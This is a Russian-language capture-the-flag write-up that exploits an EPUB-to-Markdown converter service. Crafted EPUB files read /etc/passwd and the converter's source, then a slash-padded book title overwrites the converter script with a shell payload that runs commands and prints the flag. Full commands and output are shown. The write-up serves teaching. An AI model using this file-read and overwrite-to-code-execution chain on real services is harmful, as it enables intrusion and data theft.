# Документация: Write-up

При открытии сайта видим форму, в которую можно загрузить epub-файл для конвертации в Markdown. Зальём какую-нибудь книгу и посмотрим, что произойдёт. Для удобства прикладываю [When Sysadmins Ruled the Earth](writeup/When+Sysadmins+Ruled+the+Earth.epub) (CC BY-NC-SA 2.5), на которой буду тестировать я.

Сайт выдает сконвертированный (откровенно говоря, не очень качественно) [файл в формате Markdown](writeup/When+Sysadmins+Ruled+the+Earth.md) и, что полезнее, лог конвертации:

```
Archive:  book.epub
 extracting: mimetype                
   creating: META-INF/
 extracting: META-INF/container.xml  
   creating: OEBPS/
   creating: OEBPS/Text/
   creating: OEBPS/Images/
 extracting: OEBPS/content.opf       
 extracting: OEBPS/titlepage.xhtml   
 extracting: OEBPS/nav.xhtml         
 extracting: OEBPS/Text/Chapter-1.xhtml  
 extracting: OEBPS/Text/Chapter-2.xhtml  
 extracting: OEBPS/Text/Chapter-3.xhtml  
 extracting: OEBPS/Text/Chapter-4.xhtml  
 extracting: OEBPS/Text/Chapter-5.xhtml  
 extracting: OEBPS/Text/Chapter-6.xhtml  
 extracting: OEBPS/Text/Chapter-7.xhtml  
 extracting: OEBPS/Text/Chapter-10.xhtml  
 extracting: OEBPS/Text/Chapter-8.xhtml  
 extracting: OEBPS/Text/Chapter-9.xhtml  
 extracting: OEBPS/Text/Chapter-11.xhtml  
 extracting: OEBPS/Text/Chapter-14.xhtml  
 extracting: OEBPS/Text/Chapter-12.xhtml  
 extracting: OEBPS/Text/Chapter-13.xhtml  
  inflating: META-INF/calibre_bookmarks.txt  
Rootfile found at OEBPS/content.opf
Title: When Sysadmins Ruled the Earth
Output: /tmp/converted/When Sysadmins Ruled the Earth.md
```

Из до боли знакомых строк `extracting:` делаем вывод, что epub — это zip-архив, который сервис распаковывает с помощью консольной утилиты `unzip`. Здесь можно было бы попробовать воспользоваться уязвимостью ZIP path traversal, но `unzip` не позволяет ее эксплуатировать, поэтому придется искать другой путь.

Следующая зацепка — строка `Rootfile found at ...`. Придется разобраться, как устроен формат EPUB.

Для начала попробуем залить почти пустой ZIP-файл (совсем пустой не даст сделать `zip`):

```shell
$ mkdir test-book
$ cd test-book
$ touch empty
$ zip -r ../test-book.zip .
  adding: empty (stored 0%)
```

```
Archive:  book.epub
 extracting: empty                   
Traceback (most recent call last):
  File "/home/bookkeeper/books/convert.py", line 12, in <module>
    with open("mimetype") as f:
         ^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: 'mimetype'
```

Теперь мы знаем, что конвертер написан на Python, а также путь к ниму.

На [короткой статье в русской Википедии](https://ru.wikipedia.org/wiki/Electronic_Publication) приведено краткое описание формата, из которого мы понимаем, что надо положить в `mimetype`:

```shell
$ rm empty
$ echo -n application/epub+zip >mimetype
$ rm ../test-book.zip && zip -r ../test-book.zip .
  adding: mimetype (stored 0%)
```

```
Archive:  book.epub
 extracting: mimetype                
Traceback (most recent call last):
  File "/home/bookkeeper/books/convert.py", line 18, in <module>
    container = ET.parse("META-INF/container.xml")
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.11/xml/etree/ElementTree.py", line 1218, in parse
    tree.parse(source, parser)
  File "/usr/local/lib/python3.11/xml/etree/ElementTree.py", line 569, in parse
    source = open(source, "rb")
             ^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: 'META-INF/container.xml'
```

Итак, конвертер читает некоторый XML-файл с помощью библиотеки ElementTree. Здесь можно было бы попробовать воспользоваться уязвимостями в парсерах XML, но в [документации Python](https://docs.python.org/3/library/xml.html#xml-vulnerabilities) указано, что ElementTree уязвима только к DoS-атакам, что нас не интересует.

С той же статьи на Википедии скопируем пример `META-INF/container.xml`:

```xml
<container xmlns="urn:oasis:names:tc:opendocument:xmlns:container" version="1.0"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>
```

```shell
$ mkdir META-INF
$ echo '<container xmlns="urn:oasis:names:tc:opendocument:xmlns:container" version="1.0"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>' >META-INF/container.xml
$ zip -r ../test-book.zip .
updating: mimetype (stored 0%)
  adding: META-INF/ (stored 0%)
  adding: META-INF/container.xml (deflated 27%)
```

```
Archive:  book.epub
 extracting: mimetype                
   creating: META-INF/
  inflating: META-INF/container.xml  
Rootfile found at OEBPS/content.opf
Traceback (most recent call last):
  File "/home/bookkeeper/books/convert.py", line 29, in <module>
    opf = ET.parse(rootfile)
          ^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.11/xml/etree/ElementTree.py", line 1218, in parse
    tree.parse(source, parser)
  File "/usr/local/lib/python3.11/xml/etree/ElementTree.py", line 569, in parse
    source = open(source, "rb")
             ^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: 'OEBPS/content.opf'
```

Сразу заметим, что путь из свойства `full-path` напрямую передается функции `ET.parse`. Значит ли это, что можно передать любой путь, в том числе абсолютный, и тогда конвертер прочитает произвольный файл?

```shell
$ sed -i 's!OEBPS/content.opf!/etc/passwd!' META-INF/container.xml
$ zip -r ../test-book.zip .
updating: mimetype (stored 0%)
updating: META-INF/ (stored 0%)
updating: META-INF/container.xml (deflated 30%)
```

```
Archive:  book.epub
 extracting: mimetype                
   creating: META-INF/
  inflating: META-INF/container.xml  
Rootfile found at /etc/passwd
Traceback (most recent call last):
  File "/home/bookkeeper/books/convert.py", line 29, in <module>
    opf = ET.parse(rootfile)
          ^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.11/xml/etree/ElementTree.py", line 1218, in parse
    tree.parse(source, parser)
  File "/usr/local/lib/python3.11/xml/etree/ElementTree.py", line 580, in parse
    self._root = parser._parse_whole(source)
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^
xml.etree.ElementTree.ParseError: not well-formed (invalid token): line 1, column 16
```

Да, значит, но `/etc/passwd` — невалидный XML, поэтому произвольный файл мы так не прочитаем. Будем держать эту возможность в уме. а пока вернем все как было и добавим нормальный `OEBPS/content.opf`. Его примера на Википедии уже нет, поэтому придется достать какую-нибудь книгу и скопировать оттуда, для удобства вырезав все необязательные (согласно [спефицикации](https://www.w3.org/TR/epub-rs/)) поля:

```xml
<package xmlns="http://www.idpf.org/2007/opf" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:epub="http://www.idpf.org/2007/ops" unique-identifier="pub-id" version="3.0">
	<metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
		<dc:identifier id="pub-id">5f62fde0-370a-4eb5-9df4-fd579a2d3715</dc:identifier>
		<dc:title>When Sysadmins Ruled the Earth</dc:title>
	</metadata>
	<manifest>
		<item id="titlepage" href="titlepage.xhtml" media-type="application/xhtml+xml" />
	</manifest>
	<spine>
		<itemref idref="titlepage" />
	</spine>
</package>
```

```shell
$ sed -i 's!/etc/passwd!OEBPS/content.opf!' META-INF/container.xml
$ mkdir OEBPS
$ cat >OEBPS/content.opf <<EOF
<package xmlns="http://www.idpf.org/2007/opf" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:epub="http://www.idpf.org/2007/ops" unique-identifier="pub-id" version="3.0">
	<metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
		<dc:identifier id="pub-id">5f62fde0-370a-4eb5-9df4-fd579a2d3715</dc:identifier>
		<dc:title>When Sysadmins Ruled the Earth</dc:title>
	</metadata>
	<manifest>
		<item id="titlepage" href="titlepage.xhtml" media-type="application/xhtml+xml" />
	</manifest>
	<spine>
		<itemref idref="titlepage" />
	</spine>
</package>
EOF
$ zip -r ../test-book.zip .
updating: mimetype (stored 0%)
updating: META-INF/ (stored 0%)
updating: META-INF/container.xml (deflated 27%)
  adding: OEBPS/ (stored 0%)
  adding: OEBPS/content.opf (deflated 49%)
```

```
Archive:  book.epub
 extracting: mimetype                
   creating: META-INF/
  inflating: META-INF/container.xml  
   creating: OEBPS/
  inflating: OEBPS/content.opf       
Rootfile found at OEBPS/content.opf
Title: When Sysadmins Ruled the Earth
Traceback (most recent call last):
  File "/home/bookkeeper/books/convert.py", line 61, in <module>
    with open(os.path.join(os.path.dirname(rootfile), item.get("href"))) as f:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: 'OEBPS/titlepage.xhtml'
```

Теперь файл открывается через `open`, а не `ET.parse`, поэтому можно понадеяться, что здесь проблем с несоответствию текста формату XML будет меньше, и заменить путь в `href` на какой-нибудь абсолютный:

```shell
$ sed -i 's!titlepage.xhtml!/etc/passwd!' OEBPS/content.opf
$ zip -r ../test-book.zip .
```

```
Archive:  book.epub
 extracting: mimetype                
   creating: META-INF/
  inflating: META-INF/container.xml  
   creating: OEBPS/
  inflating: OEBPS/content.opf       
Rootfile found at OEBPS/content.opf
Title: When Sysadmins Ruled the Earth
Output: /tmp/converted/When Sysadmins Ruled the Earth.md
```

Файл успешно сконвертировался! А Markdown выглядит так:

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bookkeeper:x:100:65533:Linux User,,,:/home/bookkeeper:/sbin/nologin

---
```

Итак, мы можем прочитать более-менее любой файл на файловой системе. В `/flag` и других подобных путях ничего не оказывается, поэтому попробуем прочитать единственный несистемный файл, путь к которому мы точно знаем — `/home/bookkeeper/books/convert.py`:

```shell
$ sed -i 's!/etc/passwd!/home/bookkeeper/books/convert.py!' OEBPS/content.opf
$ zip -r ../test-book.zip .
updating: mimetype (stored 0%)
updating: META-INF/ (stored 0%)
updating: META-INF/container.xml (deflated 27%)
updating: OEBPS/ (stored 0%)
updating: OEBPS/content.opf (deflated 48%)
```

```
Archive:  book.epub
 extracting: mimetype                
   creating: META-INF/
  inflating: META-INF/container.xml  
   creating: OEBPS/
  inflating: OEBPS/content.opf       
Rootfile found at OEBPS/content.opf
Title: When Sysadmins Ruled the Earth
Output: /tmp/converted/When Sysadmins Ruled the Earth.md
```

```python
#!/usr/bin/env python3
import os
import re
import subprocess
import sys
import xml.etree.ElementTree as ET

subprocess.run(["unzip", "book.epub"], check=True)

with open("mimetype") as f:
    if f.read() != "application/epub+zip":
        print("This is not a EPUB file")
        sys.exit(1)

container = ET.parse("META-INF/container.xml")

rootfile = (
    container
    .find("{urn:oasis:names:tc:opendocument:xmlns:container}rootfiles")
    .find("{urn:oasis:names:tc:opendocument:xmlns:container}rootfile")
    .get("full-path")
)
print("Rootfile found at", rootfile)

opf = ET.parse(rootfile)

title = (
    opf
    .find("{http://www.idpf.org/2007/opf}metadata")
    .find("{http://purl.org/dc/elements/1.1/}title")
    .text
)
print("Title:", title)

os.makedirs("/tmp/converted", exist_ok=True)
out_path = f"/tmp/converted/{title}.md"[:100]
f_out = open(out_path, "w")

items = (
    opf
    .find("{http://www.idpf.org/2007/opf}manifest")
    .findall("{http://www.idpf.org/2007/opf}item")
)
items_by_id = {}
for item in items:
    items_by_id[item.get("id")] = item

itemrefs = (
    opf
    .find("{http://www.idpf.org/2007/opf}spine")
    .findall("{http://www.idpf.org/2007/opf}itemref")
)
for itemref in itemrefs:
    idref = itemref.get("idref")
    item = items_by_id[idref]
    if item.get("media-type") == "application/xhtml+xml":
        with open(os.path.join(os.path.dirname(rootfile), item.get("href"))) as f:
            chapter = f.read()
        chapter = re.sub(r"", "", chapter)
        for n in range(1, 7):
            chapter = re.sub(f"", "#" * n + " ", chapter)
        chapter = re.sub(r"", "**", chapter)
        chapter = re.sub(r"", "_", chapter)
        chapter = re.sub(r"", "", chapter)
        chapter = re.sub(r"\n{3,}", "\n\n", chapter).strip()
        f_out.write(f"{chapter}\n\n---\n\n")

print("Output:", out_path)
with open("out-path.txt", "w") as f:
    f.write(out_path)

---
```

Следующую зацепку дает строчка:

```python
out_path = f"/tmp/converted/{title}.md"[:100]
```

Меняя название книги, мы можем допиться перезаписи любого файла на машине, даже не заканчивающегося на `.md`. Например, чтобы переписать `/etc/passwd`, можно подставить название `../../////.../////etc/passwd`, где количество слешей подобрано так, чтобы суффикс `.md` был обрезан.

Перезапись `/etc/passwd` вряд ли что-то даст, а вот с `convert.py` можно поиграться. Попробуем что-нибудь простое:

```shell
$ sed -i 's!/home/bookkeeper/books/convert.py!source.xhtml!' OEBPS/content.opf
$ sed -i 's!When Sysadmins Ruled the Earth!../..////////////////////////////////////////////////home/bookkeeper/books/convert.py!' OEBPS/content.opf
$ echo 'print("Hello, world!")' >OEBPS/source.xhtml
$ zip -r ../test-book.zip .
updating: mimetype (stored 0%)
updating: META-INF/ (stored 0%)
updating: META-INF/container.xml (deflated 27%)
updating: OEBPS/ (stored 0%)
updating: OEBPS/content.opf (deflated 48%)
  adding: OEBPS/source.xhtml (stored 0%)
```

```
Archive:  book.epub
 extracting: mimetype                
   creating: META-INF/
  inflating: META-INF/container.xml  
   creating: OEBPS/
  inflating: OEBPS/content.opf       
 extracting: OEBPS/source.xhtml      
Rootfile found at OEBPS/content.opf
Title: ../..////////////////////////////////////////////////home/bookkeeper/books/convert.py
Output: /tmp/converted/../..////////////////////////////////////////////////home/bookkeeper/books/convert.py
```

Ура, мы что-то перезаписали. Попробуем сконвертировать какую-нибудь книгу, чтобы вызвать на сервере `convert.py`... и получим 500 Internal Server Error.

Ладно.

Перезапустим контейнер и попробуем делать не настолько резкие изменения в `convert.py`. Впрочем, тут же оказывается, что даже если залить ровно тот же `convert.py`, который мы скачали из системы, ошибка никуда не уходит. В чем же проблема?

Присмотримся еще раз к скачанному файлу и заметим, что на его конце появляется строка `---`. Это разделитель страниц, который добавляет конвертер:

```python
f_out.write(f"{chapter}\n\n---\n\n")
```

Потыкавшись в интерпретатор Python, понимаем, что на `---` никакая валидная программа заканчиваться не может. Но кто сказал, что она должна быть написана на Python? Первая строка кода содержит [shebang](https://ru.wikipedia.org/wiki/%D0%A8%D0%B5%D0%B1%D0%B0%D0%BD%D0%B3_(Unix)), так что весьма вероятно, что язык можно изменить. Например, шелл-скрипты хороши тем, что ошибки они практически всегда игнорирует. Посмотрим, что получится:

```shell
$ cat >OEBPS/source.xhtml <<EOF
#!/bin/sh
echo "Hello, world!"
EOF
$ zip -r ../test-book.zip .
updating: mimetype (stored 0%)
updating: META-INF/ (stored 0%)
updating: META-INF/container.xml (deflated 27%)
updating: OEBPS/ (stored 0%)
updating: OEBPS/content.opf (deflated 52%)
updating: OEBPS/source.xhtml (stored 0%)
```

```
Archive:  book.epub
 extracting: mimetype                
   creating: META-INF/
  inflating: META-INF/container.xml  
   creating: OEBPS/
  inflating: OEBPS/content.opf       
 extracting: OEBPS/source.xhtml      
Rootfile found at OEBPS/content.opf
Title: ../..////////////////////////////////////////////////home/bookkeeper/books/convert.py
Output: /tmp/converted/../..////////////////////////////////////////////////home/bookkeeper/books/convert.py
```

```
Hello, world!
/home/bookkeeper/books/convert.py: line 4: ---: not found
```

Другое дело! Перезапустим контейнер и попробуем что-нибудь более полезное:

```shell
$ cat >OEBPS/source.xhtml <<EOF
#!/bin/sh
find / 2>/dev/null
EOF
$ zip -r ../test-book.zip .
updating: mimetype (stored 0%)
updating: META-INF/ (stored 0%)
updating: META-INF/container.xml (deflated 27%)
updating: OEBPS/ (stored 0%)
updating: OEBPS/content.opf (deflated 52%)
updating: OEBPS/source.xhtml (stored 0%)
```

```
Archive:  book.epub
 extracting: mimetype                
   creating: META-INF/
  inflating: META-INF/container.xml  
   creating: OEBPS/
  inflating: OEBPS/content.opf       
 extracting: OEBPS/source.xhtml      
Rootfile found at OEBPS/content.opf
Title: ../..////////////////////////////////////////////////home/bookkeeper/books/convert.py
Output: /tmp/converted/../..////////////////////////////////////////////////home/bookkeeper/books/convert.py
```

```
/
/var
/var/lock
/var/lock/subsys
/var/cache
/var/cache/apk
/var/cache/misc
/var/spool
/var/spool/cron
/var/spool/cron/crontabs
/var/spool/mail
/var/tmp
/var/opt
/var/lib
/var/lib/apk
/var/lib/udhcpd
/var/lib/misc
/var/local
/var/mail
/var/log
/var/run
/var/empty
/tmp
/tmp/epub-2
/tmp/epub-2/book.epub
...
/sbin/mkdosfs
/sbin/rmmod
/sbin/sysctl
/sbin/ipaddr
/sbin/init
/sbin/ifup
/sbin/findfs
/sbin/arp
/sbin/losetup
/sbin/ifenslave
/sbin/swapon
/sbin/pivot_root
/run
/home/bookkeeper/books/convert.py: line 4: ---: not found
```

В этом огромном списке файлов можно найти поиском по слову `flag`, что существует файл `/home/bookkeeper/flag-sxwok7.txt`. Сбросим контейнер опять и прочтем его:

```shell
$ cat >OEBPS/source.xhtml <<EOF
#!/bin/sh
cat /home/bookkeeper/flag-sxwok7.txt
EOF
$ zip -r ../test-book.zip .
updating: mimetype (stored 0%)
updating: META-INF/ (stored 0%)
updating: META-INF/container.xml (deflated 27%)
updating: OEBPS/ (stored 0%)
updating: OEBPS/content.opf (deflated 52%)
updating: OEBPS/source.xhtml (stored 0%)
```

```
Archive:  book.epub
 extracting: mimetype                
   creating: META-INF/
  inflating: META-INF/container.xml  
   creating: OEBPS/
  inflating: OEBPS/content.opf       
 extracting: OEBPS/source.xhtml      
Rootfile found at OEBPS/content.opf
Title: ../..////////////////////////////////////////////////home/bookkeeper/books/convert.py
Output: /tmp/converted/../..////////////////////////////////////////////////home/bookkeeper/books/convert.py
```

```
ugra_so_much_for_security_if3a74xwzhgs/home/bookkeeper/books/convert.py: line 4: ---: not found
```

Флаг: **ugra_so_much_for_security_if3a74xwzhgs**
